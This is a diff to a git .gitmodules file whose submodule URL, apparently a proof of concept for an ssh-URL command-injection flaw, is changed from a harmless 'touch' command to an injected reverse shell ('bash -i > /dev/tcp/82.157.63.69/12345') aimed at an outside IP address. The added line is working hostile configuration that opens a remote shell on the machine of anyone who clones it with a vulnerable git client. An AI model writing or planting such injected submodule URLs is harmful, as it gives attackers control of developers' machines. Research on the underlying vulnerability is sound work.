@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`touch whoami | firefox`foo.example.com/bar
+	url = ssh://`bash -i > /dev/tcp/82.157.63.69/12345 0>&1 | firefox`foo.example.com/bar
